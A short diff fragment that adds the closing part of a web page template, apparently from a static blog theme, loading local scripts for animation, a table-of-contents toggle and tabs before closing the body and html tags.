+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
